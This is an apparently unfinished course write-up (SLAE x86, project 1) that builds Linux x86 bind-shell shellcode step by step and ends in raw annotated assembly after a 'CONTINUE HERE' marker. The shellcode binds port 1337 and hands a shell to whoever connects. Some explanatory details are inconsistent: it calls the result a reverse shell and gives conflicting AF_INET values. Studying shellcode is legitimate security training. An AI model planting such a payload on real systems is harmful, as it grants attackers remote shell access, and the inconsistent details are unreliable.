# SLAE x86 - Project 1

# Tasks

Create a Shell_Bind_TCP shellcode
- Binds to a port  
- Execs Shell on incoming connection 

- Port number should be easily configurable

# Create a Shell_Bind_TCP shellcode 

The first task is to create shellcode that binds to a TCP port and executes a shell when connected to. I will be using `execve()` in my example code.

My assembly code is documented throughout, however, I will step through each pieces in this blog post.

## Important Information

### x86 Calling Convention

This is the calling convention for system calls (syscall()) in x86 linux. 

| Register | Argument (info) |
| ------ | ------ |
| EAX | system call numer ( + return data ) |
| EBX | 1st |
| ECX | 2nd |
| EDX | 3rd |
| ESI | 4th |
| EDI | 5th |
| EBP | 6th |


## Bind Shell Overview

The general outline of C code is below and can be found [here](https://anubissec.github.io/Creating-a-TCP-Bind-Shell/#):
```c
// Create socket  
host_sockid = socket(PF_INET, SOCK_STREAM, 0);  

// Initialize sockaddr struct to bind socket using it  
hostaddr.sin_family = AF_INET;  
hostaddr.sin_port = htons(1337);  
hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);  

// Bind socket to IP/Port in sockaddr struct  
bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr));  
    
// Listen for incoming connections  
listen(host_sockid, 2);  

// Accept incoming connection, don't store data, just use the sockfd created  
client_sockid = accept(host_sockid, NULL, NULL);  

// Duplicate file descriptors for STDIN, STDOUT and STDERR  
dup2(client_sockid, 0);  
dup2(client_sockid, 1);  
dup2(client_sockid, 2);  

// Execute /bin/sh  
execve("/bin/sh", NULL, NULL);  
close(host_sockid);  
    
return 0;
```

Since this is not a C assignment, I will assume the reader understands the code above. In essense, we must create a socket with `socket()`, bind it to a port with `bind()`, make it listen with `listen()` and `accept()`, redirect input/output to STDIN, STDOUT, and STDERR using `dup2()`, and execute `/bin/sh` using `execve()` to create our reverse shell.


## Step 1: socket()

The first thing I do is zero out the registers that I plan to be using.

I zero out ebx, then use that in a `mul` statement to zero out `eax` and `edx`, details on the mul can be found [here](https://www.aldeid.com/wiki/X86-assembly/Instructions/mul).

While I didn't need to zero out edx, I used the `mul` trick here because I found it a neat, polymorphic way to zero out the eax register which I may use in the future.

```assembly
; Create socket
xor ebx, ebx       
mul ebx             ; zero out eax, and edx
xor ecx, ecx
```

Next, I must call `socketcall()` as it is essentially a middleware function to execute the socket related functions. 

To execute `socketcall()`, I will execute a `syscall()` with the proper registers and stack values. 

The [syscall()](https://man7.org/linux/man-pages/man2/syscall.2.html) function is actually wrapped in the [socketcall()](https://man7.org/linux/man-pages/man2/socketcall.2.html) function and looks like this:
```c
int syscall(SYS_socketcall, int call, unsigned long *args);
```

The first parameter (SYS_socketcall) is a refereence to the socketcall() enumerator index which can be found by running this command in the terminal:

```bash
cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socketcall
```

This results in the ID of 102, or hex `0x66` and will be placed into register `eax`, based on the calling convention table above.


The second parameter is the argument to define the `socketcall()` function to use. In this case, it will be `0x1` for `SYS_SOCKET` which can be found by running:

```bash
cat /usr/include/linux/net.h | grep SYS_SOCKET
```

Keeping in mind the x86 Calling Convention table above, I will load the socketcall() function enumerator index `0x66` into `eax` (`al` to remove nulls) and socket() function enumerator index `0x1` into `ebx` (`bl` to remove nulls). 

The assembly looks like this:
```assembly
mov al, 0x66  		; syscall: int socketcall(int call, unsigned long *args)	
mov bl, 0x1			; int socket(int domain, int type, int protocol)  : SYS_SOCKET (0x01)	
```

Next I must push the parameters of the [socket()](https://man7.org/linux/man-pages/man2/socket.2.html) call onto the stack in reverse order. 

The socket() function prototype looks like this
```c
int socket(int domain, int type, int protocol);
```

I will use the domain parameter AF_INET which is `0x1`, found with this command:
```bash
cat /usr/include/netinet/in.h | grep AF_INET
```

The type parameter will be SOCK_STREAM which is `0x1`, found with this command:
```bash
cat /usr/include/i386-linux-gnu/bits/socket_type.h  | grep SOCK_STREAM
```

The domain parameter will be AF_INET which is `0x2`, found with this command:
```bash
cat /usr/include/i386-linux-gnu/bits/socket.h |grep AF_INET
```

The assembly looks like this:

```assembly
                    ; *args: push in reverse order to stack
push 0x6			; protocol = IPPROTO_TCP (6) - 
push 0x1			; type = SOCK_STREAM (1)
push 0x2			; domain = AF_INET (2)
mov ecx, esp
```

All that's left to do to call `socketcall()` by issuing the syscall() command `int 0x80`, after which the return value (in `eax`) will be a pointer to the newly created socket, which I move into `edi` for later use.

```assembly
int 0x80
mov edi, eax 		; store socket ptr to edi in edx
```



<br><br><br>
CONTINUE HERE
<br><br><br>






	; bind socket
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx

	mov al, 0x66  		; int socketcall(int call, unsigned long *args)	;
	mov bl, 0x2			; bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)	;


						; source: man 7 ip
						; struct sockaddr_in {
						;     sa_family_t    sin_family	; /* address family: AF_INET */
						;     in_port_t      sin_port	;   /* port in network byte order */
						;     struct in_addr sin_addr	;   /* internet address */
						; }	;

						; /* Internet address. */
						; struct in_addr {
						;     uint32_t       s_addr	;     /* address in network byte order */
						; }	;

					
						; setup stack for [sockaddr *addr] structure
	push 0x0			; INADDRY_ANY ... REMOVE??    /usr/src/linux-headers-5.10.0-kali7-common/include/uapi/linux/in.h
	push word 0x3905	; port 1337 = 0x539  = rev.. 0x3905
	push word 0x2		; sa_family_t = AF_INET
	mov ecx, esp		; move pointer to structure into ecx 

						; bind() - push args to stack
	push 0x10			; addrlen
	push ecx			; ptr socaddr *addr (on stack)
	push edi			; ptr to socket from above

	mov ecx, esp
	int 0x80		


	; listen
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx

	mov al, 0x66  		; int socketcall(int call, unsigned long *args)	;
	mov bl, 0x4			; int listen(int sockfd, int backlog)	;

	push 0x0			; backlog (0)
	push edi 			; socket ptr

	mov ecx, esp
	int 0x80



	; accept
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx

	mov al, 0x66  		; int socketcall(int call, unsigned long *args)	;
	mov bl, 0x5			; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)	;

	push ecx
	push ecx
	push edi 			; socket ptr

	mov ecx, esp
	int 0x80


	; REDIRECT I/O
	; file descriptor : fd = (stdin = 0, stdout = 1, stderr = 2)
	; Will loop through all 3 file descriptors and redirct output to socket

						 
	xchg ebx, eax		; mov file descriptor for the accepted socket to ebx

	xor ecx, ecx		; zero out ecx
	mov cl, 0x2 		; set the counter (for loop)
	
loop:					; Loop through all file descriptors
	mov al, 0x3f		; syscall: dup2 (63)  -- NOTE: eax was cleared above. Good to reduce # of instructions.
	int 0x80			; exec dup2
	dec ecx				; decrement counter
	jns loop			; jump until SF is set ; (jmp if positive)


	; Execute /bin/sh
	mov al, 0xb			; syscall: execve (11) int execve(const char *pathname, char *const argv[], char *const envp[]);

	xor edx, edx		; envp (NULL)
	push edx			; push 0x00 null terminator for string
	push 0x68732f2f		; "hs//"   LITTLE ENDIAN
	push 0x6e69622f 	; "nib/"


	mov ebx, esp		; pathname: point ebx to stack
	mov ecx, edx		; NULL

	int 0x80			; execute execve

